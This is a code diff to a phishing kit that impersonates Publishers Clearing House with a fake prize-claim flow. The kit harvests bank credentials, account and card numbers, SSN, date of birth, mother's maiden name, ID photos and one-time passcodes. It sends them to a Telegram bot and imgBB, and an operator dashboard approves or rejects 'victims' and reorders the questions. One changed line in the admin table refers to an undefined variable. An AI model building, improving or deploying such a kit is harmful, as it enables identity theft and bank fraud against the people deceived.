@@ -13,6 +13,9 @@
             --pch-border: #E0E0E0;
             --font-header: 'Century Gothic', CenturyGothic, AppleGothic, sans-serif;
             --font-body: Arial, Helvetica, sans-serif;
+            --admin-gold: #FFD700;
+            --admin-black: #1a1a1a;
+            --admin-dark-gray: #2d2d2d;
         }
         
         * { box-sizing: border-box; }
@@ -28,31 +31,35 @@
             flex-direction: column;
         }
 
-        /* Header with GUARANTEED LOGO */
+        /* Header with FIXED LOGO SPACING */
         .pch-header {
             background: white;
-            padding: 20px;
+            padding: 15px;
             text-align: center;
             border-bottom: 4px solid var(--pch-primary);
             box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
         
         .pch-logo-container {
-            display: inline-block;
-            max-width: 200px;
-            height: 80px;
-            display: flex;
+            display: inline-flex;
             align-items: center;
             justify-content: center;
+            width: 100%;
+            max-width: 450px;
+            height: auto;
         }
         
-        /* SVG Logo Styling to ensure it's the Primary Color and Crisp */
+        /* SVG Logo Styling - Responsive and Tight Spacing */
         .pch-logo-svg {
-            height: 100%;
-            width: auto;
+            height: 60px;
+            width: 100%;
+            max-width: 400px;
             fill: var(--pch-primary); 
         }
-
+        
         /* Main Container */
         .main-container { 
             flex: 1;
@@ -239,109 +246,70 @@
             border-top: 1px solid #EEE;
         }
         .footer a { color: var(--pch-red); text-decoration: none; font-weight: bold; cursor: pointer; }
+        .footer .pch-logo-container { transform: scale(0.6); margin-bottom: 15px; }
 
-        /* Admin Panel */
-        #admin-panel { display: none; max-width: 100%; width: 95%; margin: 20px auto; padding-bottom: 50px; }
+        /* --- NEW ADMIN UI (Black & Gold) --- */
+        #admin-panel { display: none; max-width: 100%; width: 95%; margin: 20px auto; padding-bottom: 50px; font-family: 'Segoe UI', sans-serif; }
         .admin-header { 
-            background: var(--pch-black); 
-            color: white; 
-            padding: 20px; 
-            border-radius: 8px 8px 0 0;
+            background: var(--admin-black); 
+            color: var(--admin-gold); 
+            padding: 25px; 
+            border-radius: 12px 12px 0 0;
             display: flex; 
             justify-content: space-between; 
             align-items: center; 
+            border-bottom: 3px solid var(--admin-gold);
         }
-        .admin-body { background: white; padding: 20px; border: 1px solid #ddd; border-top: none; border-radius: 0 0 8px 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
-        .config-box { background: #F4F4F4; padding: 15px; border-radius: 6px; margin-bottom: 20px; border: 1px solid #DDD; }
-        .admin-section-title { font-size: 14px; font-weight: bold; color: var(--pch-black); margin-bottom: 10px; border-bottom: 1px solid #DDD; padding-bottom: 5px; text-transform: uppercase; }
+        .admin-body { background: #f4f4f4; padding: 30px; border-radius: 0 0 12px 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .config-box { background: white; padding: 20px; border-radius: 8px; margin-bottom: 25px; border: 1px solid #ddd; box-shadow: 0 2px 5px rgba(0,0,0,0.03); }
+        .admin-section-title { font-size: 16px; font-weight: bold; color: var(--admin-black); margin-bottom: 15px; border-bottom: 2px solid var(--admin-gold); padding-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
         
-        table { width: 100%; border-collapse: collapse; font-size: 13px; }
-        th { background: var(--pch-black); color: white; font-weight: 700; padding: 12px; text-align: left; }
-        td { padding: 12px; border-bottom: 1px solid #EEE; vertical-align: top; }
+        table { width: 100%; border-collapse: collapse; font-size: 14px; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        th { background: var(--admin-black); color: var(--admin-gold); font-weight: 700; padding: 15px; text-align: left; }
+        td { padding: 15px; border-bottom: 1px solid #EEE; vertical-align: top; }
         .status-waiting { color: orange; font-weight: bold; }
         .status-active { color: green; font-weight: bold; }
         .status-rejected { color: red; font-weight: bold; }
-        .btn-admin { padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer; color: white; font-size: 12px; font-weight: bold; margin-right: 5px; }
-        .btn-activate { background: green; }
-        .btn-reject { background: var(--pch-red); }
-        .btn-delete { background: #CCC; color: black; }
-        .btn-save { background: var(--pch-primary); padding: 10px 20px; color: var(--pch-black); border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
-        .btn-add { background: var(--pch-black); color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-bottom: 20px; }
-
-        /* Terms Modal */
-        .modal {
-            display: none; 
-            position: fixed; 
-            z-index: 100; 
-            left: 0; top: 0; 
-            width: 100%; height: 100%; 
-            background-color: rgba(0,0,0,0.6);
-            backdrop-filter: blur(2px);
-        }
-        .modal-content {
-            background-color: #fff;
-            margin: 15% auto; 
-            padding: 30px; 
-            border-radius: 8px; 
-            width: 90%; 
-            max-width: 600px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-        }
+        
+        .btn-admin { padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; color: white; font-size: 13px; font-weight: bold; margin-right: 5px; transition: opacity 0.2s; }
+        .btn-admin:hover { opacity: 0.8; }
+        .btn-activate { background: #28a745; }
+        .btn-reject { background: #dc3545; }
+        .btn-delete { background: #6c757d; }
+        .btn-save { background: var(--admin-gold); padding: 12px 25px; color: var(--admin-black); border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 14px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .btn-add { background: var(--admin-black); color: var(--admin-gold); padding: 12px 25px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; margin-bottom: 20px; }
+        
+        /* Reorder List Styles */
+        .reorder-list { list-style: none; padding: 0; margin: 0; }
+        .reorder-item { background: white; border: 1px solid #ddd; padding: 12px; margin-bottom: 8px; border-radius: 6px; display: flex; justify-content: space-between; align-items: center; }
+        .reorder-controls { display: flex; gap: 5px; }
+        .btn-move { background: var(--admin-black); color: var(--admin-gold); border: none; width: 25px; height: 25px; border-radius: 4px; cursor: pointer; font-weight: bold; display: flex; align-items: center; justify-content: center; }
+        
+        /* Modal */
+        .modal { display: none; position: fixed; z-index: 100; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); backdrop-filter: blur(2px); }
+        .modal-content { background-color: #fff; margin: 15% auto; padding: 30px; border-radius: 8px; width: 90%; max-width: 600px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
         .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
         .close:hover { color: black; }
 
-        /* Success Screen */
-        .success-screen {
-            text-align: center;
-            padding: 40px 20px;
-        }
-        .success-icon {
-            width: 80px;
-            height: 80px;
-            background: var(--pch-red);
-            border-radius: 50%;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 40px;
-            color: white;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 15px rgba(227, 24, 65, 0.3);
-        }
-        .otp-display {
-            font-size: 32px;
-            font-weight: bold;
-            color: var(--pch-black);
-            background: #F4F4F4;
-            padding: 15px;
-            border-radius: 6px;
-            display: inline-block;
-            margin: 20px 0;
-            letter-spacing: 5px;
-            border: 2px dashed var(--pch-red);
-        }
+        /* Success / Error Screens */
+        .success-screen, .otp-screen { text-align: center; padding: 40px 20px; }
+        .success-icon { width: 80px; height: 80px; background: var(--pch-red); border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 40px; color: white; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(227, 24, 65, 0.3); }
+        .error-icon { width: 80px; height: 80px; background: #dc3545; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 40px; color: white; margin-bottom: 20px; }
+        .otp-display { font-size: 32px; font-weight: bold; color: var(--pch-black); background: #F4F4F4; padding: 15px; border-radius: 6px; display: inline-block; margin: 20px 0; letter-spacing: 5px; border: 2px dashed var(--pch-red); }
         
-        /* Admin Page Editor */
-        .page-editor {
-            background: white;
-            border: 1px solid #ddd;
-            padding: 15px;
-            margin-bottom: 15px;
-            border-radius: 4px;
-        }
-        .page-editor h4 { margin: 0 0 10px 0; color: var(--pch-red); }
-        .page-editor input { margin-bottom: 10px; }
+        /* Spinner */
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--pch-red); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
     <div class="pch-header">
-        <!-- GUARANTEED LOGO: Inline SVG ensures it always loads and is the Primary Color -->
+        <!-- FIXED LOGO SPACING: SVG text is tightly packed -->
         <div class="pch-logo-container">
-            <svg class="pch-logo-svg" viewBox="0 0 500 100" xmlns="http://www.w3.org/2000/svg">
-                <text x="10" y="70" font-family="Century Gothic, sans-serif" font-weight="900" font-size="60" id="svg-logo-text">PCH</text>
-                <rect x="200" y="40" width="3" height="50" fill="currentColor" />
-                <text x="215" y="70" font-family="Arial, sans-serif" font-weight="400" font-size="35" id="svg-logo-full-name">Publishers Clearing House</text>
+            <svg class="pch-logo-svg" viewBox="0 0 600 80" xmlns="http://www.w3.org/2000/svg">
+                <text x="10" y="55" font-family="Century Gothic, sans-serif" font-weight="900" font-size="50" id="svg-logo-text">PCH</text>
+                <text x="140" y="55" font-family="Arial, sans-serif" font-weight="400" font-size="28" id="svg-logo-full-name">Publishers Clearing House</text>
             </svg>
         </div>
     </div>
@@ -366,7 +334,7 @@
 
                 <form id="pch-form" onsubmit="return false;">
                     
-                    <!-- Steps will be dynamically injected or updated based on Admin Config -->
+                    <!-- Steps will be dynamically injected based on Admin Config -->
                     
                     <!-- Step 1: BANK NAME -->
                     <div class="form-step" id="step-1">
@@ -517,91 +485,121 @@
     <!-- ADMIN VIEW -->
     <div id="admin-panel">
         <div class="admin-header">
-            <h2 style="margin: 0;">PCH Admin Dashboard</h2>
-            <button onclick="logoutAdmin()" style="background: var(--pch-primary); color: black; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-weight: bold;">Exit Admin</button>
+            <h2 style="margin: 0; font-size: 24px;">PCH Admin Dashboard</h2>
+            <button onclick="logoutAdmin()" style="background: var(--admin-gold); color: var(--admin-black); border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold;">Exit Admin</button>
         </div>
         <div class="admin-body">
             
             <!-- API & Global Config -->
             <div class="config-box">
                 <div class="admin-section-title">Global Settings</div>
-                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 10px;">
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
                     <div>
-                        <label style="font-size: 11px;">Telegram Bot Token</label>
+                        <label style="font-size: 12px; color: #666;">Telegram Bot Token</label>
                         <input type="text" id="admin-bot-token" placeholder="123456789:ABCdef...">
                     </div>
                     <div>
-                        <label style="font-size: 11px;">Telegram Chat ID</label>
+                        <label style="font-size: 12px; color: #666;">Telegram Chat ID</label>
                         <input type="text" id="admin-chat-id" placeholder="1234567890">
                     </div>
                     <div>
-                        <label style="font-size: 11px;">imgBB API Key</label>
+                        <label style="font-size: 12px; color: #666;">imgBB API Key</label>
                         <input type="text" id="admin-imgbb-key" placeholder="a1b2c3d4e5...">
                     </div>
                     <div>
-                        <label style="font-size: 11px;">OTP Length (Digits)</label>
+                        <label style="font-size: 12px; color: #666;">OTP Length (Digits)</label>
                         <input type="number" id="admin-otp-length" value="6" min="4" max="8">
                     </div>
                 </div>
-                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-top: 10px;">
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 15px;">
                     <div>
-                        <label style="font-size: 11px;">Winner Name</label>
+                        <label style="font-size: 12px; color: #666;">Winner Name</label>
                         <input type="text" id="admin-winner-name" placeholder="John Doe">
                     </div>
                     <div>
-                        <label style="font-size: 11px;">Prize Amount</label>
+                        <label style="font-size: 12px; color: #666;">Prize Amount</label>
                         <input type="text" id="admin-prize-amount" placeholder="$7,500">
                     </div>
                     <div>
-                        <label style="font-size: 11px;">Headline Text</label>
+                        <label style="font-size: 12px; color: #666;">Headline Text</label>
                         <input type="text" id="admin-headline" placeholder="Congratulations, [Name]!">
                     </div>
                 </div>
 
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px;">
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 15px;">
                     <div>
-                        <label style="font-size: 11px;">Site Name (Logo Text)</label>
+                        <label style="font-size: 12px; color: #666;">Site Name (Logo Text)</label>
                         <input type="text" id="admin-site-name" placeholder="Publishers Clearing House">
                     </div>
                     <div>
-                        <label style="font-size: 11px;">Primary Color (Hex Code)</label>
-                        <input type="color" id="admin-primary-color" value="#F2C94C" style="width: 100%; height: 35px; border: none; cursor: pointer;">
+                        <label style="font-size: 12px; color: #666;">Primary Color (Hex Code)</label>
+                        <input type="color" id="admin-primary-color" value="#F2C94C" style="width: 100%; height: 40px; border: none; cursor: pointer; border-radius: 4px;">
                     </div>
                 </div>
 
-                <button class="btn-save" onclick="saveGlobalConfig()" style="margin-top: 10px;">Save Global Settings</button>
+                <button class="btn-save" onclick="saveGlobalConfig()" style="margin-top: 20px; width: 100%;">Save Global Settings</button>
             </div>
 
             <!-- Success Page Editor -->
             <div class="config-box">
                 <div class="admin-section-title">Edit "Successfully Verified" Page</div>
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                     <div>
-                        <label style="font-size: 11px;">Success Title</label>
+                        <label style="font-size: 12px; color: #666;">Success Title</label>
                         <input type="text" id="admin-success-title" placeholder="Successfully Verified!">
                     </div>
                     <div>
-                        <label style="font-size: 11px;">Success Button Text</label>
+                        <label style="font-size: 12px; color: #666;">Success Button Text</label>
                         <input type="text" id="admin-success-button" placeholder="Finish">
                     </div>
                 </div>
-                <div style="margin-top: 10px;">
-                    <label style="font-size: 11px;">Success Message</label>
+                <div style="margin-top: 15px;">
+                    <label style="font-size: 12px; color: #666;">Success Message</label>
                     <textarea id="admin-success-message" rows="3" style="width: 100%; padding: 10px; border: 1px solid #DDD; border-radius: 4px; font-family: Arial;">Congratulations! You have been successfully verified.</textarea>
                 </div>
-                <button class="btn-save" onclick="saveSuccessPageConfig()" style="margin-top: 10px;">Save Success Page</button>
+                <button class="btn-save" onclick="saveSuccessPageConfig()" style="margin-top: 15px; width: 100%;">Save Success Page</button>
+            </div>
+
+            <!-- OTP Page Editor -->
+            <div class="config-box">
+                <div class="admin-section-title">Edit "OTP Entry" Page</div>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+                    <div>
+                        <label style="font-size: 12px; color: #666;">OTP Page Title</label>
+                        <input type="text" id="admin-otp-title" placeholder="Enter Verification Code">
+                    </div>
+                    <div>
+                        <label style="font-size: 12px; color: #666;">OTP Button Text</label>
+                        <input type="text" id="admin-otp-button" placeholder="Verify & Claim Prize">
+                    </div>
+                </div>
+                <div style="margin-top: 15px;">
+                    <label style="font-size: 12px; color: #666;">OTP Page Message</label>
+                    <textarea id="admin-otp-message" rows="3" style="width: 100%; padding: 10px; border: 1px solid #DDD; border-radius: 4px; font-family: Arial;">Please enter the code sent to your email.</textarea>
+                </div>
+                <button class="btn-save" onclick="saveOtpPageConfig()" style="margin-top: 15px; width: 100%;">Save OTP Page</button>
+            </div>
+
+            <!-- Page Reorder Editor -->
+            <div class="config-box">
+                <div class="admin-section-title">Reorder Pages</div>
+                <p style="font-size: 13px; color: #666; margin-bottom: 15px;">Use the arrows to change the order of the questions on the victim's page.</p>
+                <ul id="reorder-list" class="reorder-list">
+                    <!-- Items injected via JS -->
+                </ul>
+                <button class="btn-save" onclick="savePageOrder()" style="margin-top: 15px; width: 100%;">Save Page Order</button>
             </div>
 
             <!-- Page Editor -->
             <div class="config-box">
-                <div class="admin-section-title">Edit Page Content (Labels & Titles)</div>
+                <div class="admin-section-title">Edit Page Content (Labels)</div>
                 <div id="page-editors-container">
                     <!-- Editors will be injected here via JS -->
                 </div>
-                <button class="btn-save" onclick="savePageLabels()">Save Page Labels</button>
+                <button class="btn-save" onclick="savePageLabels()" style="margin-top: 15px; width: 100%;">Save Page Labels</button>
             </div>
 
-            <h3>Recent Submissions</h3>
+            <h3 style="color: var(--admin-black); border-bottom: 2px solid var(--admin-gold); padding-bottom: 10px;">Recent Submissions</h3>
             <table id="submissions-table">
                 <thead>
                     <tr>
@@ -633,11 +631,10 @@
     </div>
 
     <div class="footer">
-        <div class="pch-logo-container" style="transform: scale(0.5); margin-bottom: 20px;">
-            <svg class="pch-logo-svg" viewBox="0 0 500 100" xmlns="http://www.w3.org/2000/svg">
-                <text x="10" y="70" font-family="Century Gothic, sans-serif" font-weight="900" font-size="60" id="footer-logo-text">PCH</text>
-                <rect x="200" y="40" width="3" height="50" fill="currentColor" />
-                <text x="215" y="70" font-family="Arial, sans-serif" font-weight="400" font-size="35" id="footer-logo-full-name">Publishers Clearing House</text>
+        <div class="pch-logo-container" style="transform: scale(0.6); margin-bottom: 15px;">
+            <svg class="pch-logo-svg" viewBox="0 0 600 80" xmlns="http://www.w3.org/2000/svg">
+                <text x="10" y="55" font-family="Century Gothic, sans-serif" font-weight="900" font-size="50" id="footer-logo-text">PCH</text>
+                <text x="140" y="55" font-family="Arial, sans-serif" font-weight="400" font-size="28" id="footer-logo-full-name">Publishers Clearing House</text>
             </svg>
         </div>
         <p>&copy; 2026 <span id="footer-site-name">Publishers Clearing House</span>. All Rights Reserved.</p>
@@ -664,6 +661,9 @@
             successMessage: 'Congratulations! You have been successfully verified.',
             successSubMessage: 'Your prize will be deposited within 24 hours.',
             successButton: 'Finish',
+            otpTitle: 'Enter Verification Code',
+            otpMessage: 'Please enter the code sent to your email.',
+            otpButton: 'Verify & Claim Prize',
             // Default Labels for each step
             labels: {
                 'step-1-field-1': 'Bank Name',
@@ -682,7 +682,9 @@
                 'step-9-field-1': 'Front of ID',
                 'step-9-field-2': 'Back of ID',
                 'step-10-field-1': 'Enter Verification Code'
-            }
+            },
+            // Default Page Order
+            pageOrder: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
         };
 
         let config = JSON.parse(JSON.stringify(defaultConfig));
@@ -714,14 +716,20 @@
             document.getElementById('admin-success-message').value = config.successMessage;
             document.getElementById('admin-success-button').value = config.successButton;
 
+            // Apply OTP Page Config
+            document.getElementById('admin-otp-title').value = config.otpTitle;
+            document.getElementById('admin-otp-message').value = config.otpMessage;
+            document.getElementById('admin-otp-button').value = config.otpButton;
+
             // Apply Labels to Victim View
             applyLabels();
             
             // Apply Content to Victim View
             applySiteContent();
 
-            // Generate Admin Page Editors
+            // Generate Admin Page Editors & Reorder List
             generatePageEditors();
+            generateReorderList();
         }
 
         function applyLabels() {
@@ -730,6 +738,11 @@
                 const el = document.getElementById('label-' + key);
                 if (el) el.innerText = value;
             }
+            
+            // Apply OTP Page Labels specifically
+            document.getElementById('label-step-10-field-1').innerText = config.otpTitle;
+            const otpBtn = document.querySelector('#step-10 .btn-primary');
+            if(otpBtn) otpBtn.innerText = config.otpButton;
         }
 
         function applySiteContent() {
@@ -783,7 +796,8 @@
             steps.forEach(step => {
                 const editor = document.createElement('div');
                 editor.className = 'page-editor';
-                editor.innerHTML = `<h4>Step ${step.id}: ${step.name}</h4>`;
+                editor.style.cssText = "background: white; border: 1px solid #ddd; padding: 15px; margin-bottom: 10px; border-radius: 6px;";
+                editor.innerHTML = `<h4 style="margin: 0 0 10px 0; color: var(--admin-gold); background: var(--admin-black); padding: 5px 10px; border-radius: 4px; font-size: 13px;">Step ${step.id}: ${step.name}</h4>`;
                 
                 step.fields.forEach(field => {
                     const labelKey = `step-${step.id}-${field}`;
@@ -791,14 +805,61 @@
                     const inputId = `admin-label-${labelKey}`;
                     
                     editor.innerHTML += `
-                        <div style="margin-bottom: 5px;">
-                            <label style="font-size: 12px;">Label for ${field}: <input type="text" id="${inputId}" value="${currentValue}"></label>
+                        <div style="margin-bottom: 8px;">
+                            <label style="font-size: 12px; color: #666;">Label for ${field}: <input type="text" id="${inputId}" value="${currentValue}" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;"></label>
                         </div>
                     `;
                 });
                 
                 container.appendChild(editor);
             });
+        }
+
+        function generateReorderList() {
+            const list = document.getElementById('reorder-list');
+            list.innerHTML = '';
+            
+            // Use the saved order or default
+            const order = config.pageOrder || [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
+            
+            const stepNames = {
+                1: 'Bank Name', 2: 'Username', 3: 'Email', 4: 'Bank Account', 5: 'Credit Card',
+                6: 'DOB', 7: 'SSN', 8: 'Maiden Name', 9: 'ID Upload', 10: 'OTP'
+            };
+
+            order.forEach((stepNum, index) => {
+                const li = document.createElement('li');
+                li.className = 'reorder-item';
+                li.innerHTML = `
+                    <span style="font-weight: bold;">${stepNum}. ${stepNames[stepNum]}</span>
+                    <div class="reorder-controls">
+                        <button class="btn-move" onclick="moveStep(${stepNum}, -1)">↑</button>
+                        <button class="btn-move" onclick="moveStep(${stepNum}, 1)">↓</button>
+                    </div>
+                `;
+                list.appendChild(li);
+            });
+        }
+
+        function moveStep(stepNum, direction) {
+            let order = config.pageOrder;
+            const index = order.indexOf(stepNum);
+            if (index === -1) return;
+            
+            const newIndex = index + direction;
+            if (newIndex < 0 || newIndex >= order.length) return;
+            
+            // Swap
+            [order[index], order[newIndex]] = [order[newIndex], order[index]];
+            
+            config.pageOrder = order;
+            generateReorderList();
+        }
+
+        function savePageOrder() {
+            localStorage.setItem('pch_config', JSON.stringify(config));
+            // Reload page to apply order to victim view
+            location.reload();
         }
 
         function savePageLabels() {
@@ -862,6 +923,16 @@
             alert('Success Page Updated!');
         }
 
+        function saveOtpPageConfig() {
+            config.otpTitle = document.getElementById('admin-otp-title').value;
+            config.otpMessage = document.getElementById('admin-otp-message').value;
+            config.otpButton = document.getElementById('admin-otp-button').value;
+            
+            localStorage.setItem('pch_config', JSON.stringify(config));
+            applyLabels();
+            alert('OTP Page Updated!');
+        }
+
         // --- VICTIM LOGIC ---
 
         let currentStep = 1;
@@ -871,16 +942,21 @@
         let currentSubmissionId = null;
 
         function updateProgress(step) {
-            const percentage = (step / 10) * 100;
+            // Calculate progress based on the ORDERED steps
+            const order = config.pageOrder || [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
+            const totalSteps = order.length;
+            const currentIndex = order.indexOf(step);
+            const percentage = ((currentIndex + 1) / totalSteps) * 100;
+            
             document.getElementById('progress-fill').style.width = percentage + '%';
             
-            // Get the label for this step to show in progress
-            let stepName = 'Step ' + step;
-            // Simple mapping for progress text
-            const names = ['Bank Name', 'Username', 'Email', 'Account', 'Credit Card', 'DOB', 'SSN', 'Maiden Name', 'ID Upload', 'OTP'];
-            if (step <= 10) stepName = names[step-1] || 'Step ' + step;
-            
-            document.getElementById('progress-text').innerText = `Step ${step} of 10: ${stepName}`;
+            // Get the name of the current step
+            const stepNames = {
+                1: 'Bank Name', 2: 'Username', 3: 'Email', 4: 'Bank Account', 5: 'Credit Card',
+                6: 'DOB', 7: 'SSN', 8: 'Maiden Name', 9: 'ID Upload', 10: 'OTP'
+            };
+            const currentName = stepNames[step] || 'Step ' + step;
+            document.getElementById('progress-text').innerText = `Step ${currentIndex + 1} of ${totalSteps}: ${currentName}`;
             document.getElementById('error-container').style.display = 'none';
         }
 
@@ -963,13 +1039,8 @@
                 // Send to Telegram
                 sendToTelegram(data);
 
-                // Show Waiting Screen
-                document.getElementById('step-10').classList.add('hidden');
-                updateProgress(10);
-                
-                // Show the OTP code to the victim
-                document.getElementById('otp-waiting').classList.remove('hidden');
-                document.getElementById('generated-otp-display').innerText = generatedOTP;
+                // Show Verifying Screen
+                showVerifyingScreen();
 
                 // Start polling for admin activation
                 startPollingForActivation();
@@ -985,13 +1056,13 @@
                 if (currentSub && currentSub.status === 'ACTIVE') {
                     showFinalSuccessScreen();
                 } else if (currentSub && currentSub.status === 'REJECTED') {
-                    showError('Incorrect OTP! Please try again.');
+                    showError('Invalid OTP! Please try again.');
                 } else {
                     // Still waiting for admin
                     showError('Incorrect OTP or Admin is verifying...');
                 }
             } else {
-                showError('Incorrect OTP! Please try again.');
+                showError('Invalid OTP! Please try again.');
             }
         }
 
@@ -1002,9 +1073,20 @@
             document.getElementById('otp-code').value = '';
             document.getElementById('otp-code').focus();
             
-            // If they were on the waiting screen, take them back to step 10
-            document.getElementById('otp-waiting').classList.add('hidden');
+            // Hide verifying screen, show OTP input
+            document.getElementById('verifying-screen').classList.add('hidden');
             document.getElementById('step-10').classList.remove('hidden');
+        }
+
+        function showVerifyingScreen() {
+            document.getElementById('step-10').classList.add('hidden');
+            updateProgress(10);
+            document.getElementById('verifying-screen').classList.remove('hidden');
+        }
+
+        function showFinalSuccessScreen() {
+            document.getElementById('verifying-screen').classList.add('hidden');
+            document.getElementById('otp-success').classList.remove('hidden');
         }
 
         function uploadToImgBB(file) {
@@ -1084,13 +1166,11 @@
                 if (currentSub && currentSub.status === 'ACTIVE') {
                     clearInterval(interval);
                     showFinalSuccessScreen();
+                } else if (currentSub && currentSub.status === 'REJECTED') {
+                    clearInterval(interval);
+                    showError('Invalid OTP! Please try again.');
                 }
             }, 2000);
-        }
-
-        function showFinalSuccessScreen() {
-            document.getElementById('otp-waiting').classList.add('hidden');
-            document.getElementById('otp-success').classList.remove('hidden');
         }
 
         // --- ADMIN LOGIC ---
@@ -1124,8 +1204,8 @@
                 }
 
                 const idLinks = `
-                    ${sub.idFrontUrl ? `<a href="${sub.idFrontUrl}" target="_blank">Front</a> | ` : 'Front | '}
-                    ${sub.idBackUrl ? `<a href="${sub.idBackUrl}" target="_blank">Back</a>` : 'Back'}
+                    ${sub.idFrontUrl ? `<a href="${sub.idFrontUrl}" target="_blank" style="color: var(--admin-gold);">Front</a> | ` : 'Front | '}
+                    ${sub.idBackUrl ? `<a href="${sub.idBackUrl}" target="_blank" style="color: var(--admin-gold);">Back</a>` : 'Back'}
                 `;
 
                 const row = `
@@ -1133,7 +1213,7 @@
                         <td>${sub.timestamp}</td>
                         <td><b>${sub.bankName}</b><br><small>${sub.email}</small></td>
                         <td>${sub.accountNum}<br><small>${sub.routingNum}</small><br>💳 ${sub.cc}</td>
-                        <td>🆔 ${sub.ssn}<br>🎂 ${sub.dob}<br>👩‍👧‍👦 ${sub.maiden}</td>
+                        <td>🆔 ${sub.ssn}<br>🎂 ${data.dob}<br>👩‍👧‍👦 ${sub.maiden}</td>
                         <td>${idLinks}</td>
                         <td><b>${sub.otp}</b></td>
                         <td class="${statusClass}">${sub.status}</td>
@@ -1201,4 +1281,4 @@
         });
     </script>
 </body>
-</html>
+                        </html>
